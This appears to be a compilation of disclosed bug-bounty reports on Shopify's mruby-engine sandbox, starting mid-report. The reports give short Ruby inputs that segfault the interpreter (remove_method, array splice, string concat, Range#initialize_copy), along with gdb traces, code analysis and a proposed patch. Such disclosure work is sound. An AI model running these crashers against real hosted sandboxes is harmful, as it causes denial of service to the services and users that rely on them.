/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96a509]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea96f342]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f5dea85671d]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_exec_node+0x1d) [0x7f5dea85811d]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3(ruby_run_node+0x1e) [0x7f5dea85a25e]
ruby [0x40089b]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0) [0x7f5de9883730]
ruby(_start+0x29) [0x4008c9]
```

If we run it under gdb:
```
$ gdb --args /usr/bin/ruby bin/sandbox /tmp/sample.rb
(gdb) r
Starting program: /usr/bin/ruby bin/sandbox /tmp/sample.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 26490)]

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff37f53df in codegen (s=s@entry=0x7ffff23a8830, tree=0x7ffff23a0f24, val=val@entry=1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361
1361          node *e = tree->cdr->cdr->car;
(gdb) x/2i 0x00007ffff37f53df
=> 0x7ffff37f53df <codegen+895>:        mov    rax,QWORD PTR [rsi]
   0x7ffff37f53e2 <codegen+898>:        lea    rcx,[rax-0x33]
(gdb) i r rsi
rsi            0x0      0
(gdb) list *(0x00007ffff37f53df)
0x7ffff37f53df is in codegen (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361).
1356        break;
1357
1358      case NODE_IF:
1359        {
1360          int pos1, pos2;
1361          node *e = tree->cdr->cdr->car;
1362
1363          switch ((intptr_t)tree->car->car) {
1364          case NODE_TRUE:
1365          case NODE_INT:
(gdb) print tree
$2 = (node *) 0x7ffff23a0f24
(gdb) print tree->cdr
$3 = (struct mrb_ast_node *) 0x7ffff23a0f0c
(gdb) print tree->cdr->cdr
$4 = (struct mrb_ast_node *) 0x7ffff23a0e2c
(gdb) print tree->car
$5 = (struct mrb_ast_node *) 0x0
(gdb) print *tree
$6 = {
  car = 0x0,
  cdr = 0x7ffff23a0f0c,
  lineno = 1,
  filename_index = 0
}
(gdb)
```

Even if gdb points that the bug is at `mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-compiler/core/codegen.c:1361` it is not, the bug its at the next line `1363`. Below is the affected code:

```C
  case NODE_IF:
    {
      int pos1, pos2;
      node *e = tree->cdr->cdr->car;

      switch ((intptr_t)tree->car->car) {   /* <-- tree->car happens to be NULL  */
      case NODE_TRUE:
      case NODE_INT:
      case NODE_STR:
        codegen(s, tree->cdr->car, val);
        return;
      case NODE_FALSE:
      case NODE_NIL:
        codegen(s, e, val);
        return;
      }
      codegen(s, tree->car, VAL);
      pop();
```

As we can see from gdb and the code, the bug is at `switch ((intptr_t)tree->car->car)` as `tree->car` points to a NULL which causes the NULL pointer dereference when accessing it.


Tested under latest version:
```
$ date
Sat Nov 12 00:23:43 CET 2016
$ cd mruby-engine/
$ git rev-parse HEAD
5a5eac4f380b5169882e8a851f0c0abcc7e2f266
$ cd ext/mruby_engine/mruby
$ git rev-parse HEAD
6c299aae67e2e0f13a470b855298bc1efb43387a
```

---

### [SIGSEGV when invalid argument on remove_method](https://hackerone.com/reports/181874)

- **Report ID:** `181874`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @jpenalbae
- **Bounty:** - usd
- **Disclosed:** 2016-12-17T02:30:48.759Z
- **CVE(s):** -

**Vulnerability Information:**

There is an invalid memory read on mruby when calling to `remove_method` with invalid arguments which causes a SIGSEGV which leads into denial of service.

## Sample

The following code tries to remove a method using a `nil` as argument
```ruby
class Child
   remove_method nil
end
```

There are many other variants, such as using a float, an integer, a string, a Class, etc... Which obviously are non valid method symbols.
```ruby
class Child
   remove_method 1
   remove_method 2.123
   remove_method 'aaaa'
   remove_method Child
end
```

## Crash

Here we can see the crash (full crash output attached)
```
$ ruby bin/sandbox ../triage/uniq/min/segv/mrb_type > /tmp/full-crash.log
bin/sandbox:20: [BUG] Segmentation fault at 0x0000000000000e
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:001e48 EVAL   bin/sandbox:20 [FINISH]
c:0001 p:0000 s:0002 E:001e00 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:20:in `<main>'
bin/sandbox:20:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f8c4d77d554 RBP: 0x00007f8c4c2fe4e0 RSP: 0x00007f8c4c2fc898
 RAX: 0x000000000000008f RBX: 0x0000000000000006 RCX: 0x00007f8c4d7fbf83
 RDX: 0x000000000000008f RDI: 0x00007f8c4c2fe4e0 RSI: 0x0000000000000006
  R8: 0x00007f8c4d7f842f  R9: 0x00007f8c4c2fe010 R10: 0x0000000000000191
 R11: 0x00007f8c4d77d540 R12: 0x0000000000000010 R13: 0x000000000000008f
 R14: 0x00007f8c4c306160 R15: 0x00007f8c4c306100 EFL: 0x0000000000010246

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a96ea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a970dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51971364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f8c51a22dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f8c516f5ed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_respond_to+0x14) [0x7f8c4d77d554] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:71
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_check_convert_type+0x6b) [0x7f8c4d78c63b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:310
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_check_string_type+0x1c) [0x7f8c4d7897cc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:1743
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(join_ary+0xad) [0x7f8c4d78fe0d] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1007
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_join+0x2e) [0x7f8c4d790dbe] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1031
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vformat+0x14b) [0x7f8c4d7a28cb] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:345
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_name_error+0x92) [0x7f8c4d7a2ae2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:382
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_mod_remove_method+0x137) [0x7f8c4d77c3c7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1985
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f8c4d795cf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f8c4d79b567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f8c4d76f173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f8c516ec464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f8c50a6830d]

```

## Crash debug

```
(gdb) r
Starting program: /usr/bin/ruby bin/sandbox /tmp/crasher.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 21707)]
[New Thread 0x7ffff2348700 (LWP 21758)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 21758)]
mrb_class (v=..., mrb=mrb@entry=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/class.h:50
50          return mrb_obj_ptr(v)->c;
(gdb) x/1i $rip
=> 0x7ffff37c8554 <mrb_respond_to+20>:  mov    rsi,QWORD PTR [rsi+0x8]
(gdb) i r rsi
rsi            0x6      6
(gdb) x/1xg $rsi+0x8
0xe:    Cannot access memory at address 0xe
```

The crash happens at `ext/mruby_engine/mruby/include/mruby/class.h:50`
```c
static inline struct RClass*
mrb_class(mrb_state *mrb, mrb_value v)
{
  switch (mrb_type(v)) {
  case MRB_TT_FALSE:
    if (mrb_fixnum(v))
      return mrb->false_class;
    return mrb->nil_class;
  case MRB_TT_TRUE:
    return mrb->true_class;
  case MRB_TT_SYMBOL:
    return mrb->symbol_class;
  case MRB_TT_FIXNUM:
    return mrb->fixnum_class;
  case MRB_TT_FLOAT:
    return mrb->float_class;
  case MRB_TT_CPTR:
    return mrb->object_class;
  case MRB_TT_ENV:
    return NULL;
  default:
    return mrb_obj_ptr(v)->c;  /* BUG: Bad memory access */
  }
}
```

If we check the vale `v`:
```
(gdb) print v
$1 = {
  value = {
    p = 0x6,
    {
      i_flag = 0,
      i = 3
    },
    {
      sym_flag = 6,
      sym = 0
    },
    bp = 0x6,
    fp = 0x6,
    vp = 0x6
  },
  w = 6
}
```
`mrb_obj_ptr` is the following macro
```c
#define mrb_obj_ptr(v)   ((struct RObject*)(mrb_ptr(v)))
```

So `mrb_obj_ptr(v)->c` would be equivalent to this:
```
(gdb) print ((struct RObject*)v)->c
Cannot access memory at address 0xe
(gdb) print &((struct RObject*)v)->c
$2 = (struct RClass **) 0xe
```

If we check the backtrace:
```
(gdb) bt
#0  mrb_class (v=..., mrb=mrb@entry=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/class.h:50
#1  mrb_respond_to (mrb=mrb@entry=0x7ffff23494e0, obj=obj@entry=..., mid=mid@entry=143)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1492
#2  0x00007ffff37d763b in convert_type (raise=0 '\000', method=0x7ffff384342f "to_str", tname=0x7ffff3844446 "String", val=..., mrb=0x7ffff23494e0)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:310
#3  mrb_check_convert_type (mrb=mrb@entry=0x7ffff23494e0, val=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7ffff3844446 "String",
    method=method@entry=0x7ffff384342f "to_str") at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/object.c:352
#4  0x00007ffff37d47cc in mrb_check_string_type (mrb=mrb@entry=0x7ffff23494e0, str=..., str@entry=...)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:1743
#5  0x00007ffff37dae0d in join_ary (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., sep=sep@entry=..., list=...)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1007
#6  0x00007ffff37dbdbe in mrb_ary_join (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., sep=...)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:1031
#7  0x00007ffff37ed8cb in mrb_vformat (mrb=mrb@entry=0x7ffff23494e0, format=0x7ffff3843547 "method '%S' not defined in %S", ap=ap@entry=0x7ffff23479a8)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:345
#8  0x00007ffff37edae2 in mrb_name_error (mrb=mrb@entry=0x7ffff23494e0, id=id@entry=0, fmt=fmt@entry=0x7ffff3843547 "method '%S' not defined in %S")
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/error.c:382
#9  0x00007ffff37c73c7 in remove_method (mid=0, mod=..., mrb=0x7ffff23494e0)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1985
#10 mrb_mod_remove_method (mrb=0x7ffff23494e0, mod=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:2006
#11 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351520, pc=<optimized out>)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
#12 0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351520, self=..., stack_keep=stack_keep@entry=0)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#13 0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#14 0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333
#15 0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
(gdb)
```

We can see that whenever the desired method to delete is not found, mruby will raise an error. This is handled by `remove_method()` at `ext/mruby_engine/mruby/src/class.c:1985`:
```c
static void
remove_method(mrb_state *mrb, mrb_value mod, mrb_sym mid)
{
  struct RClass *c = mrb_class_ptr(mod);
  khash_t(mt) *h = find_origin(c)->mt;
  khiter_t k;

  if (h) {
    k = kh_get(mt, mrb, h, mid);
    if (k != kh_end(h)) {
      kh_del(mt, mrb, h, k);
      mrb_funcall(mrb, mod, "method_removed", 1, mrb_symbol_value(mid));
      return;
    }
  }

  mrb_name_error(mrb, mid, "method '%S' not defined in %S",
    mrb_sym2str(mrb, mid), mod);  /* <--- Raise an error */
}
```

Later on, mruby tries to convert the symbol in order to print it which is what causes the crash.

## Proposed fix

As the arguments for `remove_method()` should at least be a method type symbol. I propose the following check at `mrb_mod_remove_method()`
```diff
diff --git a/src/class.c b/src/class.c
index 47a6c84..a898b46 100644
--- a/src/class.c
+++ b/src/class.c
@@ -2003,6 +2003,11 @@ mrb_mod_remove_method(mrb_state *mrb, mrb_value mod)

   mrb_get_args(mrb, "*", &argv, &argc);
   while (argc--) {
+
+    /* Crash fix. Ignore invalid types */
+    if ((!argv->value.sym) || (argv->value.sym_flag != MRB_SYMBOL_FLAG))
+      mrb_raise(mrb, E_TYPE_ERROR, "Invalid type for remove_method");
+
     remove_method(mrb, mod, mrb_symbol(*argv));
     argv++;
   }
```

mruby with the fix applied stops the crash:
```
$ bin/sandbox /tmp/crasher.rb
bin/sandbox:20:in `sandbox_eval': Invalid type for remove_method (MRubyEngine::EngineRuntimeError)
        from bin/sandbox:20:in `<main>'
```

## Impact
This is not exploitable and its impact its limited to DoS of the service running the ruby sandbox.

---

### [SIGSEV on mrb_ary_splice](https://hackerone.com/reports/182027)

- **Report ID:** `182027`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @jpenalbae
- **Bounty:** - usd
- **Disclosed:** 2016-12-17T02:30:17.988Z
- **CVE(s):** -

**Vulnerability Information:**

## Sample
The following code causes a SIGSEV when executed under the sandbox
```
t0me=methods
t0me[0,0]=t0me
```

## Crash
Here we can see the crash (full crash output attached)
```
$ bin/sandbox /tmp/mrb_ary_splice-crash.rb
bin/sandbox:21: [BUG] Segmentation fault at 0x00005200000004
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:0010a8 EVAL   bin/sandbox:21 [FINISH]
c:0001 p:0000 s:0002 E:0024b0 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:21:in `<main>'
bin/sandbox:21:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007ff2a22bcf58 RBP: 0x0000000000000028 RSP: 0x00007ff2a0e2aa20
 RAX: 0x00007ff2a0e8c6f0 RBX: 0x0000000000000005 RCX: 0x0000000000000001
 RDX: 0x0000005200000004 RDI: 0x00007ff2a0e2c4e0 RSI: 0x00007ff2a0e34550
  R8: 0x00007ff2a0e2c000  R9: 0x00007ff2a0e8c900 R10: 0x0000000000000004
 R11: 0x0000000000000000 R12: 0x0000000000000084 R13: 0x0000000000000042
 R14: 0x00007ff2a0e34550 R15: 0x00007ff2a0e4d940 EFL: 0x0000000000010246

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c4ea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a65c50dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a649f364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7ff2a6550dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a6223ed0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_splice+0x108) [0x7ff2a22bcf58] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/include/mruby/boxing_word.h:83
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_ary_aset+0x177) [0x7ff2a22be337] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:789
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7ff2a22c3cf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7ff2a22c9567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7ff2a229d173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7ff2a621a464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7ff2a559630d]
```

## Crash debug
```
(gdb) r
Starting program: /usr/bin/ruby bin/sandbox /tmp/mrb_ary_splice-crash.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 5511)]
[New Thread 0x7ffff2348700 (LWP 5565)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 5565)]
mrb_ary_splice (mrb=mrb@entry=0x7ffff23494e0, ary=ary@entry=..., head=<optimized out>, len=<optimized out>, len@entry=0, rpl=...)
    at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615
615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);
(gdb) x/2i $rip
=> 0x7ffff37d9f58 <mrb_ary_splice+264>: cmp    BYTE PTR [rdx],0x5
   0x7ffff37d9f5b <mrb_ary_splice+267>: jbe    0x7ffff37d9f24 <mrb_ary_splice+212>
(gdb) i r rdx
rdx            0x5200000004     352187318276
(gdb) list *($rip)
0x7ffff37d9f58 is in mrb_ary_splice (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/array.c:615).
610         value_move(a->ptr + head + argc, a->ptr + tail, a->len - tail);
611       }
612
613       for (i = 0; i < argc; i++) {
614         *(a->ptr + head + i) = *(argv + i);
615         mrb_field_write_barrier_value(mrb, (struct RBasic*)a, argv[i]);
616       }
617
618       a->len = size;
619
(gdb)
```

`mrb_field_write_barrier_value` macro equals to:
```c
#define mrb_field_write_barrier_value(mrb, obj, val) do{\
  if (!mrb_immediate_p(val)) mrb_field_write_barrier((mrb), (obj), mrb_basic_ptr(val)); \
} while (0)
```

`mrb_immediate_p` macro equals to:
```c
#define mrb_immediate_p(x) (mrb_type(x) < MRB_TT_HAS_BASIC)  // <-- Bug happens here
```

`mrb_type()` code:
```c
static inline enum mrb_vtype
mrb_type(mrb_value o)
{
  switch (o.w) {
  case MRB_Qfalse:
  case MRB_Qnil:
    return MRB_TT_FALSE;
  case MRB_Qtrue:
    return MRB_TT_TRUE;
  case MRB_Qundef:
    return MRB_TT_UNDEF;
  }
  if (o.value.i_flag == MRB_FIXNUM_FLAG) {
    return MRB_TT_FIXNUM;
  }
  if (o.value.sym_flag == MRB_SYMBOL_FLAG) {
    return MRB_TT_SYMBOL;
  }
  return o.value.bp->tt;
}
```

The bug happens once `mrb_type()` returns and `mrb_immediate_p` macro tries to compare against `MRB_TT_HAS_BASIC`.

## Impact
DoS of the service running the ruby sandbox. Does not look like that this could lead to remote code execution, but I would not discard it if the value of `argv[i]` could be controlled by the user.

---

### [SIGSEGV on mruby mrb_str_modify() (Invalid memory access)](https://hackerone.com/reports/183231)

- **Report ID:** `183231`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @jpenalbae
- **Bounty:** - usd
- **Disclosed:** 2016-12-17T02:30:01.984Z
- **CVE(s):** -

**Vulnerability Information:**

There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.

## Sample

The following code triggers the bug (attached as mrb_str_modify.min.rb):
```ruby
def n
if $0
end
""if 00end
qqq=Proc.new{|*x|x.join}
qqq.("",<<000,"",
000
"")
qqq.("","#{<<000}",
000
"")
0[<<0000,
#{<<0000}
0000
0000
0]
```

## Crash
Here we can see the crash (full crash output attached)
```
$ bin/sandbox /tmp/mrb_str_modify.min.rb
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001
ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
c:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]
c:0001 p:0000 s:0002 E:000730 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
bin/sandbox:21:in `<main>'
bin/sandbox:21:in `sandbox_eval'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80
 RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00
 RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001
  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330
 R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80
 R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202

-- C level backtrace information -------------------------------------------
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]
/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68
/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]
/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]
```


## Crash debug

```
(gdb) r
Starting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff7ff5700 (LWP 30942)]
[New Thread 0x7ffff2348700 (LWP 30993)]

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff2348700 (LWP 30993)]
mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660
660       check_frozen(mrb, s);
(gdb) x/1i $rip
=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]
(gdb) i r rsi
rsi            0x1      1
(gdb) print (mrb_value)$rsi
$1 = {
  value = {
    p = 0x1,
    {
      i_flag = 1,
      i = 0
    },
    {
      sym_flag = 1,
      sym = 0
    },
    bp = 0x1,
    fp = 0x1,
    vp = 0x1
  },
  w = 1
}
(gdb) list *$rip
0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).
499     }
500
501     static void
502     check_frozen(mrb_state *mrb, struct RString *s)
503     {
504       if (RSTR_FROZEN_P(s)) {
505         mrb_raise(mrb, E_RUNTIME_ERROR, "can't modify frozen string");
506       }
507     }
508
(gdb)
```

Backtrace
```
(gdb) bt
#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660
#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758
#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219
#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766
#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68
#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333
#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109
```

The crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline
```c
static void
check_frozen(mrb_state *mrb, struct RString *s)
{
  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here
    mrb_raise(mrb, E_RUNTIME_ERROR, "can't modify frozen string");
  }
}
```

Actually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.

## Impact
Its impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.

Samples generating different invalid addresses have been attached.
```
$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003
$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1
bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001
```

---

### [Range#initialize_copy null pointer dereference](https://hackerone.com/reports/181685)

- **Report ID:** `181685`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 10000 usd
- **Disclosed:** 2016-12-17T01:03:44.537Z
- **CVE(s):** -

**Vulnerability Information:**

Heya!

It's possible to segfault mruby through mruby-engine with the following snippet of code:

    Range.remove_method(:initialize_copy)
    (1..2).dup.to_s

This can be triggered through mruby-engine like this:

    MRubyEngine.new(512*1024, 1000, 1000).sandbox_eval("/tmp", %{
      Range.remove_method(:initialize_copy)
      (1..2).dup.to_s
    })

The `dup` and `clone` methods allocate a new object and then call `initialize_copy` on the new object with the old object as an argument to copy over internal state.

